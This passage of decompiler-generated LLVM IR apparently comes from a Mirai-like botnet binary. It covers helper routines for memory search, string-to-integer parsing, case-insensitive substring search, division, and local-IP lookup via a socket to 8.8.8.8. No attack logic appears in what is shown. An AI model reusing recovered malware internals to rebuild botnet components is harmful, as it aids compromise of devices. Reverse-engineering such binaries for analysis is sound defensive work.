  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_f870, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_f894 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_f894, label %dec_label_pc_f89c, label %dec_label_pc_f8a4

dec_label_pc_f89c:                                ; preds = %dec_label_pc_f8b8, %dec_label_pc_f8a4, %entry, %dec_label_pc_f8e4
  %storemerge = phi i32 [ %v1_f8e4, %dec_label_pc_f8e4 ], [ -1, %entry ], [ -1, %dec_label_pc_f8a4 ], [ -1, %dec_label_pc_f8b8 ]
  ret i32 %storemerge

dec_label_pc_f8a4:                                ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_f89c, label %dec_label_pc_f8ac

dec_label_pc_f8ac:                                ; preds = %dec_label_pc_f8a4
  br label %dec_label_pc_f8c4

dec_label_pc_f8b8:                                ; preds = %bb, %dec_label_pc_f8d8
  %v1_f8c43 = phi i32 [ %v1_f8d8, %dec_label_pc_f8d8 ], [ 0, %bb ]
  %v1_f8b8 = add i32 %v0_f8e4, 1
  %v9_f8bc = icmp eq i32 %v1_f8b8, %arg2
  br i1 %v9_f8bc, label %dec_label_pc_f89c, label %dec_label_pc_f8c4

dec_label_pc_f8c4:                                ; preds = %dec_label_pc_f8b8, %dec_label_pc_f8ac
  %v0_f8e4 = phi i32 [ %v1_f8b8, %dec_label_pc_f8b8 ], [ 0, %dec_label_pc_f8ac ]
  %v1_f8c4 = phi i32 [ %v1_f8c43, %dec_label_pc_f8b8 ], [ 0, %dec_label_pc_f8ac ]
  %v2_f8c4 = add i32 %v1_f8c4, %arg3
  %v3_f8c4 = inttoptr i32 %v2_f8c4 to i8*
  %v4_f8c4 = load i8, i8* %v3_f8c4, align 1
  %v2_f8c8 = add i32 %v0_f8e4, %arg1
  %v3_f8c8 = inttoptr i32 %v2_f8c8 to i8*
  %v4_f8c8 = load i8, i8* %v3_f8c8, align 1
  %v9_f8cc = icmp eq i8 %v4_f8c8, %v4_f8c4
  br i1 %v9_f8cc, label %dec_label_pc_f8d8, label %bb

bb:                                               ; preds = %dec_label_pc_f8c4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_f8b8

dec_label_pc_f8d8:                                ; preds = %dec_label_pc_f8c4
  %v1_f8d8 = add i32 %v1_f8c4, 1
  store i32 %v1_f8d8, i32* @ip, align 4
  %v9_f8dc = icmp eq i32 %v1_f8d8, %arg4
  br i1 %v9_f8dc, label %dec_label_pc_f8e4, label %dec_label_pc_f8b8

dec_label_pc_f8e4:                                ; preds = %dec_label_pc_f8d8
  %v1_f8e4 = add i32 %v0_f8e4, 1
  br label %dec_label_pc_f89c

; uselistorder directives
  uselistorder i32 %v1_f8d8, { 1, 2, 0 }
  uselistorder i32 %v1_f8c4, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f8b8, { 1, 0 }
  uselistorder label %dec_label_pc_f89c, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_f8fc

dec_label_pc_f8fc:                                ; preds = %.thread, %dec_label_pc_f910, %bb, %entry
  %v0_f8fc = phi i32 [ %tmp, %entry ], [ %v5_f8fc, %bb ], [ %v5_f8fc, %dec_label_pc_f910 ], [ %v5_f8fc, %.thread ]
  %v1_f8fc = inttoptr i32 %v0_f8fc to i8*
  %v2_f8fc = load i8, i8* %v1_f8fc, align 1
  %v5_f8fc = add i32 %v0_f8fc, 1
  %v7_f900 = icmp eq i8 %v2_f8fc, 9
  br i1 %v7_f900, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_f8fc
  br label %dec_label_pc_f8fc

bb:                                               ; preds = %dec_label_pc_f8fc
  %v8_f904 = icmp eq i8 %v2_f8fc, 32
  br i1 %v8_f904, label %dec_label_pc_f8fc, label %dec_label_pc_f910

dec_label_pc_f910:                                ; preds = %bb
  %v7_f910 = icmp eq i8 %v2_f8fc, 10
  br i1 %v7_f910, label %dec_label_pc_f8fc, label %dec_label_pc_f918

dec_label_pc_f918:                                ; preds = %dec_label_pc_f910
  %v7_f918 = icmp eq i8 %v2_f8fc, 45
  br i1 %v7_f918, label %dec_label_pc_fa08, label %dec_label_pc_f920

dec_label_pc_f920:                                ; preds = %dec_label_pc_f918
  %v7_f920 = icmp eq i8 %v2_f8fc, 43
  br i1 %v7_f920, label %bb54, label %dec_label_pc_f930

bb54:                                             ; preds = %dec_label_pc_f920
  %v2_f924 = inttoptr i32 %v5_f8fc to i8*
  %v3_f924 = load i8, i8* %v2_f924, align 1
  %v6_f924 = add i32 %v0_f8fc, 2
  br label %dec_label_pc_f930

dec_label_pc_f930:                                ; preds = %bb54, %dec_label_pc_f920, %dec_label_pc_fa08
  %v1_f9d839 = phi i32 [ %v5_fa08, %dec_label_pc_fa08 ], [ %v5_f8fc, %dec_label_pc_f920 ], [ %v6_f924, %bb54 ]
  %v0_f95810.in = phi i8 [ %v2_fa08, %dec_label_pc_fa08 ], [ %v2_f8fc, %dec_label_pc_f920 ], [ %v3_f924, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_fa08 ], [ 2147483647, %dec_label_pc_f920 ], [ 2147483647, %bb54 ]
  %v0_fa18 = phi i32 [ 1, %dec_label_pc_fa08 ], [ 0, %dec_label_pc_f920 ], [ 0, %bb54 ]
  %v2_f938 = udiv i32 %storemerge1, %arg2
  %v3_f938 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_f958.outer

dec_label_pc_f958.outer:                          ; preds = %.thread5, %dec_label_pc_f930
  %v1_f9d8.ph = phi i32 [ %v6_f9d8, %.thread5 ], [ %v1_f9d839, %dec_label_pc_f930 ]
  %v2_f9d4.ph = phi i32 [ %v5_f9d4, %.thread5 ], [ 0, %dec_label_pc_f930 ]
  %v1_f998.ph.in = phi i8 [ %v3_f9d8, %.thread5 ], [ %v0_f95810.in, %dec_label_pc_f930 ]
  %v1_f9b0.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_f930 ]
  %v3_f9a4 = icmp uge i32 %v2_f9d4.ph, %v2_f938
  %v9_f9a4 = icmp eq i32 %v2_f9d4.ph, %v2_f938
  %v2_f9a8 = xor i1 %v3_f9a4, true
  %v3_f9a8 = or i1 %v9_f9a4, %v2_f9a8
  %v2_f9ac = xor i1 %v9_f9a4, true
  %v3_f9ac = and i1 %v3_f9a4, %v2_f9ac
  %v2_f9cc = icmp eq i1 %v9_f9a4, false
  br label %dec_label_pc_f958

dec_label_pc_f958:                                ; preds = %dec_label_pc_f958.outer, %dec_label_pc_f9e0
  %v1_f9d8 = phi i32 [ %v5_f9e0, %dec_label_pc_f9e0 ], [ %v1_f9d8.ph, %dec_label_pc_f958.outer ]
  %v1_f9b0 = phi i32 [ -1, %dec_label_pc_f9e0 ], [ %v1_f9b0.ph, %dec_label_pc_f958.outer ]
  %v1_f998.in = phi i8 [ %v2_f9e0, %dec_label_pc_f9e0 ], [ %v1_f998.ph.in, %dec_label_pc_f958.outer ]
  %v1_f998 = zext i8 %v1_f998.in to i32
  %v1_f958 = urem i32 %v1_f998, 256
  %v1_f95c = add nsw i32 %v1_f958, -48
  %v1_f964 = add nsw i32 %v1_f958, -97
  %v1_f968 = add nsw i32 %v1_f998, -48
  %v1_f96c = add nsw i32 %v1_f958, -65
  %tmp87 = icmp ult i32 %v1_f95c, 10
  br i1 %tmp87, label %dec_label_pc_f99c, label %dec_label_pc_f974

dec_label_pc_f974:                                ; preds = %dec_label_pc_f958
  %v2_f974 = icmp ugt i32 %v1_f96c, 24
  %v7_f974 = icmp eq i32 %v1_f96c, 25
  %v2_f978 = xor i1 %v7_f974, true
  %v3_f978 = and i1 %v2_f974, %v2_f978
  br i1 %v3_f978, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_f974
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_f974, %bb55
  %v0_f98c15 = phi i32 [ %v1_f968, %dec_label_pc_f974 ], [ 0, %bb55 ]
  %v2_f97c = xor i1 %v2_f974, true
  %v3_f97c = or i1 %v7_f974, %v2_f97c
  br i1 %v3_f97c, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_f98c = phi i32 [ %v0_f98c15, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_f978, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_f984 = icmp ugt i32 %v1_f964, 24
  %v11_f984 = icmp eq i32 %v1_f964, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_f988 = phi i1 [ %v7_f974, %bb58 ], [ %v11_f984, %bb59 ]
  %v0_f988 = phi i1 [ %v2_f974, %bb58 ], [ %v6_f984, %bb59 ]
  %v2_f988 = xor i1 %v1_f988, true
  %v3_f988 = and i1 %v0_f988, %v2_f988
  br i1 %v3_f988, label %dec_label_pc_f9ec, label %dec_label_pc_f98c

dec_label_pc_f98c:                                ; preds = %bb60
  %v2_f98c = icmp eq i32 %v0_f98c, 0
  %. = select i1 %v2_f98c, i32 87, i32 55
  %v2_f998 = sub nsw i32 %v1_f998, %.
  br label %dec_label_pc_f99c

dec_label_pc_f99c:                                ; preds = %dec_label_pc_f958, %dec_label_pc_f98c
  %v0_f9b033 = phi i32 [ %v1_f96c, %dec_label_pc_f958 ], [ %., %dec_label_pc_f98c ]
  %v3_f9d4 = phi i32 [ %v1_f968, %dec_label_pc_f958 ], [ %v2_f998, %dec_label_pc_f98c ]
  %v2_f99c = sub i32 %v3_f9d4, %arg2
  %v4_f99c = xor i32 %v3_f9d4, %arg2
  %v5_f99c = xor i32 %v2_f99c, %v3_f9d4
  %v6_f99c = and i32 %v5_f99c, %v4_f99c
  %v7_f99c = icmp slt i32 %v6_f99c, 0
  %v8_f99c = icmp slt i32 %v2_f99c, 0
  %v2_f9a0 = xor i1 %v8_f99c, %v7_f99c
  br i1 %v2_f9a0, label %dec_label_pc_f9a4, label %dec_label_pc_f9ec

dec_label_pc_f9a4:                                ; preds = %dec_label_pc_f99c
  br i1 %v3_f9a8, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_f9a4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_f9a4, %bb63
  %v0_f9b032 = phi i32 [ %v0_f9b033, %dec_label_pc_f9a4 ], [ 0, %bb63 ]
  br i1 %v3_f9ac, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_f9b0 = phi i32 [ %v0_f9b032, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_f9b0, 0
  %v4_f9b0 = zext i1 %tmp88 to i32
  %v5_f9b0 = or i32 %v0_f9b0, %v4_f9b0
  %v7_f9b0 = icmp eq i32 %v5_f9b0, 0
  br i1 %v7_f9b0, label %dec_label_pc_f9b8, label %dec_label_pc_f9e0

dec_label_pc_f9b8:                                ; preds = %bb66
  %v2_f9c4 = sub i32 %v3_f9d4, %v3_f938
  %v4_f9c4 = xor i32 %v3_f9d4, %v3_f938
  %v5_f9c4 = xor i32 %v2_f9c4, %v3_f9d4
  %v6_f9c4 = and i32 %v5_f9c4, %v4_f9c4
  %v7_f9c4 = icmp slt i32 %v6_f9c4, 0
  %v8_f9c4 = icmp slt i32 %v2_f9c4, 0
  %v9_f9c4 = icmp eq i32 %v3_f9d4, %v3_f938
  %v3_f9c8 = xor i1 %v8_f9c4, %v7_f9c4
  %v4_f9c8 = or i1 %v9_f9c4, %v3_f9c8
  br i1 %v4_f9c8, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_f9b8
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_f9b8
  br i1 %v2_f9cc, label %.thread5, label %dec_label_pc_f9e0

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_f9d4 = mul i32 %v2_f9d4.ph, %arg2
  %v5_f9d4 = add i32 %v3_f9d4, %v4_f9d4
  %v2_f9d8 = inttoptr i32 %v1_f9d8 to i8*
  %v3_f9d8 = load i8, i8* %v2_f9d8, align 1
  %v6_f9d8 = add i32 %v1_f9d8, 1
  br label %dec_label_pc_f958.outer

dec_label_pc_f9e0:                                ; preds = %thread-pre-split, %bb66
  %v1_f9e0 = inttoptr i32 %v1_f9d8 to i8*
  %v2_f9e0 = load i8, i8* %v1_f9e0, align 1
  %v5_f9e0 = add i32 %v1_f9d8, 1
  br label %dec_label_pc_f958

dec_label_pc_f9ec:                                ; preds = %dec_label_pc_f99c, %bb60
  %v1_f9ec = icmp slt i32 %v1_f9b0, 0
  %v2_fa18 = icmp eq i32 %v0_fa18, 0
  br i1 %v1_f9ec, label %dec_label_pc_fa18, label %dec_label_pc_f9f4

dec_label_pc_f9f4:                                ; preds = %dec_label_pc_f9ec
  br i1 %v2_fa18, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_f9f4
  %v2_f9f8 = sub i32 0, %v2_f9d4.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_f9f4, %bb69
  %v1_fa04 = phi i32 [ -2147483648, %bb71 ], [ %v2_f9d4.ph, %dec_label_pc_f9f4 ], [ %v2_f9f8, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_fa04

dec_label_pc_fa08:                                ; preds = %dec_label_pc_f918
  %v1_fa08 = inttoptr i32 %v5_f8fc to i8*
  %v2_fa08 = load i8, i8* %v1_fa08, align 1
  %v5_fa08 = add i32 %v0_f8fc, 2
  br label %dec_label_pc_f930

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f9ec
  br i1 %v2_fa18, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_fa18
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_fa18
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_fa18, { 1, 0 }
  uselistorder i32 %v2_f9c4, { 1, 0 }
  uselistorder i32 %v2_f99c, { 1, 0 }
  uselistorder i32 %v3_f9d4, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_f974, { 1, 2, 0 }
  uselistorder i1 %v2_f974, { 1, 0, 2 }
  uselistorder i32 %v1_f958, { 1, 2, 0 }
  uselistorder i32 %v1_f998, { 1, 0, 2 }
  uselistorder i32 %v1_f9b0, { 1, 0 }
  uselistorder i32 %v1_f9d8, { 2, 3, 1, 0 }
  uselistorder i1 %v9_f9a4, { 1, 0, 2 }
  uselistorder i1 %v3_f9a4, { 1, 0 }
  uselistorder i32 %v2_f9d4.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_f938, { 1, 0, 2 }
  uselistorder i32 %v2_f938, { 1, 0 }
  uselistorder i32 %v5_f8fc, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_f8fc, { 0, 1, 3, 2 }
  uselistorder i32 55, { 0, 2, 1 }
  uselistorder i32 25, { 2, 3, 1, 0 }
  uselistorder i8 32, { 1, 2, 0 }
  uselistorder i8 9, { 1, 0 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_f99c, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_f958, { 1, 0 }
  uselistorder label %dec_label_pc_f930, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f8fc, { 1, 2, 0, 3 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fa28 = load i32, i32* @r4, align 4
  %v6_fa28 = load i32, i32* @r5, align 4
  %v9_fa28 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_fa38 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_fa40 = inttoptr i32 %v0_fa38 to i32*
  store i32 0, i32* %v2_fa40, align 4
  %v0_fa4c = load i32, i32* %r4.global-to-local, align 4
  %v3_fa50 = call i32 @socket(i32 2, i32 2, i32 %v0_fa4c)
  %v7_fa54 = icmp eq i32 %v3_fa50, -1
  store i32 %v3_fa50, i32* @r5, align 4
  br i1 %v7_fa54, label %bb, label %dec_label_pc_fa64

bb:                                               ; preds = %entry
  %v1_fa5c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fab0

dec_label_pc_fa64:                                ; preds = %entry
  %v2_fa70 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fa70, i32* @r4, align 4
  %v0_fa7c = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_fa90 = call i32 @__libc_connect(i32 %v3_fa50, i32 %v2_fa70, i32 %v0_fa7c)
  store i32 %v2_fa70, i32* @r1, align 4
  %v2_fa98 = ptrtoint i32* %stack_var_-20 to i32
  %v0_fa9c = load i32, i32* @r5, align 4
  %v3_faa0 = call i32 @__GI_getsockname(i32 %v0_fa9c, i32 %v2_fa70, i32 %v2_fa98)
  %v0_faa4 = load i32, i32* @r5, align 4
  %v1_faa8 = call i32 @__GI___libc_close(i32 %v0_faa4)
  br label %dec_label_pc_fab0

dec_label_pc_fab0:                                ; preds = %bb, %dec_label_pc_fa64
  %storemerge = phi i32 [ 134744072, %dec_label_pc_fa64 ], [ %v1_fa5c, %bb ]
  store i32 %v3_fa28, i32* @r4, align 4
  store i32 %v6_fa28, i32* @r5, align 4
  store i32 %v9_fa28, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_fa70, { 1, 0, 2, 3 }
  uselistorder i32 %v3_fa50, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 134744072, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 6, 7, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 15, 16, 13, 14, 12, 11, 10, 9, 8, 0, 7, 6, 3, 2, 1, 5, 4 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fab0, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_fac0 = load i8, i8* %tmp, align 1
  %v2_fac4 = icmp eq i8 %v3_fac0, 0
  br i1 %v2_fac4, label %bb, label %dec_label_pc_fad8

bb:                                               ; preds = %entry
  %v4_fac0 = zext i8 %v3_fac0 to i32
  br label %dec_label_pc_faec

dec_label_pc_fad8:                                ; preds = %entry
  br label %dec_label_pc_fadc

dec_label_pc_fadc:                                ; preds = %dec_label_pc_fadc, %dec_label_pc_fad8
  %v0_fadc = phi i32 [ %v1_fadc, %dec_label_pc_fadc ], [ 0, %dec_label_pc_fad8 ]
  %v1_fadc = add i32 %v0_fadc, 1
  %v2_fae0 = add i32 %v1_fadc, %arg2
  %v3_fae0 = inttoptr i32 %v2_fae0 to i8*
  %v4_fae0 = load i8, i8* %v3_fae0, align 1
  %v2_fae4 = icmp eq i8 %v4_fae0, 0
  br i1 %v2_fae4, label %dec_label_pc_faec, label %dec_label_pc_fadc

dec_label_pc_faec:                                ; preds = %dec_label_pc_fadc, %bb
  %v0_fb3021 = phi i32 [ %v4_fac0, %bb ], [ %v1_fadc, %dec_label_pc_fadc ]
  %v0_faf42 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_faf42, 1
  br i1 %tmp29, label %dec_label_pc_fb44, label %dec_label_pc_fb00

dec_label_pc_fb00:                                ; preds = %dec_label_pc_faec, %dec_label_pc_faf4.backedge
  %v0_faf8.in = phi i32 [ %v0_faf8, %dec_label_pc_faf4.backedge ], [ %v0_faf42, %dec_label_pc_faec ]
  %v1_fb0c = phi i32 [ %v1_fb0c15, %dec_label_pc_faf4.backedge ], [ 0, %dec_label_pc_faec ]
  %v0_fb00 = phi i32 [ %v5_fb00, %dec_label_pc_faf4.backedge ], [ %tmp23, %dec_label_pc_faec ]
  %v0_faf8 = add i32 %v0_faf8.in, -1
  %v1_fb00 = inttoptr i32 %v0_fb00 to i8*
  %v2_fb00 = load i8, i8* %v1_fb00, align 1
  %v3_fb00 = zext i8 %v2_fb00 to i32
  %v5_fb00 = add i32 %v0_fb00, 1
  %v1_fb04 = add nsw i32 %v3_fb00, -65
  %v2_fb0c = add i32 %v1_fb0c, %arg2
  %v3_fb0c = inttoptr i32 %v2_fb0c to i8*
  %v4_fb0c = load i8, i8* %v3_fb0c, align 1
  %v6_fb0c = zext i8 %v4_fb0c to i32
  %v1_fb10 = add nsw i32 %v6_fb0c, -65
  %tmp38 = icmp ult i32 %v1_fb04, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_fb00
  %v5_fb14 = or i32 %v3_fb00, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_fb00, %bb30
  %v0_fb20 = phi i32 [ %v3_fb00, %dec_label_pc_fb00 ], [ %v5_fb14, %bb30 ]
  %tmp39 = icmp ult i32 %v1_fb10, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_fb1c = or i32 %v6_fb0c, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_fb20 = phi i32 [ %v6_fb0c, %bb31 ], [ %v5_fb1c, %bb32 ]
  %v9_fb20 = icmp eq i32 %v0_fb20, %v1_fb20
  br i1 %v9_fb20, label %dec_label_pc_fb2c, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_faf4.backedge

dec_label_pc_faf4.backedge:                       ; preds = %bb34, %dec_label_pc_fb2c
  %v1_fb0c15 = phi i32 [ 0, %bb34 ], [ %v1_fb2c, %dec_label_pc_fb2c ]
  %tmp35 = icmp slt i32 %v0_faf8, 1
  br i1 %tmp35, label %dec_label_pc_fb44, label %dec_label_pc_fb00

dec_label_pc_fb2c:                                ; preds = %bb33
  %v1_fb2c = add i32 %v1_fb0c, 1
  %v9_fb30 = icmp eq i32 %v0_fb3021, %v1_fb2c
  br i1 %v9_fb30, label %dec_label_pc_fb38, label %dec_label_pc_faf4.backedge

dec_label_pc_fb38:                                ; preds = %dec_label_pc_fb2c
  %v2_fb38 = sub i32 %v5_fb00, %tmp23
  br label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_faf4.backedge, %dec_label_pc_faec, %dec_label_pc_fb38
  %storemerge = phi i32 [ %v2_fb38, %dec_label_pc_fb38 ], [ -1, %dec_label_pc_faec ], [ -1, %dec_label_pc_faf4.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_fb2c, { 1, 0 }
  uselistorder i32 %v0_fb00, { 1, 0 }
  uselistorder i32 %v1_fb0c, { 1, 0 }
  uselistorder i8 %v3_fac0, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder label %dec_label_pc_fb44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_faf4.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_fb00, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_fb4c = load i32, i32* @r1, align 4
  %v1_fb4c = add i32 %v0_fb4c, -1
  store i32 %v1_fb4c, i32* %r2.global-to-local, align 4
  %v2_fb4c = icmp eq i32 %v0_fb4c, 0
  %v7_fb4c = icmp eq i32 %v0_fb4c, 1
  %v0_fb50 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_fb4c, i32 %v0_fb50)
  br i1 %v2_fb4c, label %dec_label_pc_fc34, label %dec_label_pc_fb58

dec_label_pc_fb58:                                ; preds = %entry
  %v0_fb58 = load i32, i32* %r0.global-to-local, align 4
  %v1_fb58 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_fb58, %v1_fb58
  br i1 %tmp, label %dec_label_pc_fb60, label %dec_label_pc_fbec

dec_label_pc_fb60:                                ; preds = %dec_label_pc_fb58
  %v1_fb60 = load i32, i32* %r2.global-to-local, align 4
  %v2_fb60 = and i32 %v1_fb60, %v1_fb58
  %v4_fb60 = icmp eq i32 %v2_fb60, 0
  br i1 %v4_fb60, label %dec_label_pc_fbf8, label %dec_label_pc_fb68

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb60
  %v3_fb68 = icmp ult i32 %v1_fb58, 536870912
  br i1 %v3_fb68, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_fb68
  %v4_fb6c = mul i32 %v1_fb58, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_fb68, %.thread
  %v0_fb8c.pr36.ph = phi i32 [ %v4_fb6c, %.thread ], [ %v1_fb58, %dec_label_pc_fb68 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_fb68 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_fb8c.pr36 = phi i32 [ %v4_fb80, %bb81 ], [ %v0_fb8c.pr36.ph, %.preheader.preheader ]
  %v1_fb84 = phi i32 [ %v4_fb84, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_fb78 = icmp ugt i32 %v0_fb8c.pr36, 268435455
  br i1 %v2_fb78, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_fb8cthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_fb7c = icmp ult i32 %v0_fb8c.pr36, %v0_fb58
  br i1 %v4_fb7c, label %bb80, label %dec_label_pc_fb8cthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_fb80 = and i32 %v0_fb8c.pr36, 268435456
  %v3_fb80 = icmp eq i32 %v2_fb80, 0
  %v4_fb80 = mul i32 %v0_fb8c.pr36, 16
  br i1 %v3_fb80, label %bb81, label %dec_label_pc_fb8c.loopexit

bb81:                                             ; preds = %bb80
  %v2_fb84 = and i32 %v1_fb84, 268435456
  %v3_fb84 = icmp eq i32 %v2_fb84, 0
  %v4_fb84 = mul i32 %v1_fb84, 16
  br i1 %v3_fb84, label %.preheader, label %dec_label_pc_fb8cthread-pre-split.loopexit.loopexit

dec_label_pc_fb8cthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_fb9848.ph = phi i32 [ %v1_fb84, %bb ], [ %v4_fb84, %bb81 ]
  %v0_fb8c.pr38.ph = phi i32 [ %v0_fb8c.pr36, %bb ], [ %v4_fb80, %bb81 ]
  br label %dec_label_pc_fb8cthread-pre-split.loopexit

dec_label_pc_fb8cthread-pre-split.loopexit:       ; preds = %dec_label_pc_fb8cthread-pre-split.loopexit.loopexit, %.thread2
  %v1_fb9848 = phi i32 [ %v1_fb84, %.thread2 ], [ %v1_fb9848.ph, %dec_label_pc_fb8cthread-pre-split.loopexit.loopexit ]
  %v0_fb8c.pr38 = phi i32 [ %v0_fb8c.pr36, %.thread2 ], [ %v0_fb8c.pr38.ph, %dec_label_pc_fb8cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_fb8cthread-pre-split

dec_label_pc_fb8cthread-pre-split:                ; preds = %dec_label_pc_fb8cthread-pre-split.loopexit, %bb83
  %v1_fb9846 = phi i32 [ %v1_fb9848, %dec_label_pc_fb8cthread-pre-split.loopexit ], [ %v3_fb98, %bb83 ]
  %v0_fb8c.pr = phi i32 [ %v0_fb8c.pr38, %dec_label_pc_fb8cthread-pre-split.loopexit ], [ %v3_fb94, %bb83 ]
  br label %dec_label_pc_fb8c

dec_label_pc_fb8c.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_fb8c

dec_label_pc_fb8c:                                ; preds = %dec_label_pc_fb8c.loopexit, %dec_label_pc_fb8cthread-pre-split
  %v1_fb98 = phi i32 [ %v1_fb9846, %dec_label_pc_fb8cthread-pre-split ], [ %v1_fb84, %dec_label_pc_fb8c.loopexit ]
  %v1_fb94 = phi i32 [ %v0_fb8c.pr, %dec_label_pc_fb8cthread-pre-split ], [ %v4_fb80, %dec_label_pc_fb8c.loopexit ]
  %v2_fb8c = icmp slt i32 %v1_fb94, 0
  br i1 %v2_fb8c, label %dec_label_pc_fba0, label %bb82

bb82:                                             ; preds = %dec_label_pc_fb8c
  %v4_fb90 = icmp ult i32 %v1_fb94, %v0_fb58
  br i1 %v4_fb90, label %bb83, label %dec_label_pc_fba0

bb83:                                             ; preds = %bb82
  %v3_fb94 = mul i32 %v1_fb94, 2
  %v2_fb98 = icmp slt i32 %v1_fb98, 0
  %v3_fb98 = mul i32 %v1_fb98, 2
  br i1 %v2_fb98, label %dec_label_pc_fba0, label %dec_label_pc_fb8cthread-pre-split

